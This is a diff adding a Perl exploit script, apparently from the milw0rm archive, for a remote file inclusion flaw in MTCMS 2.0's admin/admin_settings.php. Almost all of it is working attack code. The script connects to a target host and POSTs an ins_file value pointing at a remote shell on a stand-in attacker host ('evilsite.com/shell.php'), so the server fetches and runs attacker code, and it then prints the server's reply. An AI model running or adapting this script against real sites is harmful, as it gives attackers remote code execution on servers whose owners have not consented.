@@ -1,0 +1,60 @@
+#!/usr/bin/perl
+# +-------------------------------------------------------------------------------------------
+# + MTCMS <= 2.0 (admin/admin_settings.php) Remote File Include Exploit
+# +-------------------------------------------------------------------------------------------
+# + Affected Software .: MTCMS <= 2.0
+# + Vendor ............: http://www.mtcms.co.uk/
+# + Download ..........: http://mtcms.co.uk/downloads/index.php?file=MTCMS-V2.rar
+# + Description .......: "MTCMS is a PHP/MySQL, Content Management System (CMS)."
+# + Class .............: Remote File Inclusion
+# + Risk ..............: High (Remote File Execution)
+# + Found By ..........: nuffsaid <nuffsaid[at]newbslove.us>
+# + Requirements.......: register_globals = on
+# +-------------------------------------------------------------------------------------------
+
+use Getopt::Long;
+use URI::Escape;
+use IO::Socket;
+
+$remotefile = "http://evilsite.com/shell.php";
+
+main();
+
+sub usage
+{
+    print "\nMTCMS <= 2.0 Remote File Include Exploit\n";
+    print "nuffsaid <nuffsaid[at]newbslove.us>\n";
+    print "-h, --host\ttarget host\t(example.com)\n";
+    print "-f, --file\tremote file\t(http://evilsite.com/shell.php)\n";
+    print "-d, --dir\tinstall dir\t(/mtcms)\n";
+    exit;
+}
+
+sub main
+{
+    GetOptions ('h|host=s' => \$host,'f|file=s' => \$file,'d|dir=s' => \$dir);
+    usage() unless $host;
+    $remotefile = $file unless !$file;
+    $url = uri_escape($remotefile);
+    
+    $sock = IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>"$host",PeerPort=>"80")
+     or die "\nconnect() failed.\n";
+     
+    print "\nconnected to ".$host.", sending data.\n";
+    $sendurl = "inst=true&ins_file=".$url."";
+    $sendlen = length($sendurl);
+    print $sock "POST ".$dir."/admin/admin_settings.php?b=addons&c=easy_add HTTP/1.1\n";
+    print $sock "Host: ".$host."\n";
+    print $sock "Connection: close\n";
+    print $sock "Content-Type: application/x-www-form-urlencoded\n";
+    print $sock "Content-Length: ".$sendlen."\n\n";
+    print $sock $sendurl;
+    print "attempted to include remote file, server response:\n\n";
+    while($recvd = <$sock>)
+    {
+        print " ".$recvd."";
+    }
+    exit;
+}
+
+# milw0rm.com [2006-12-25]
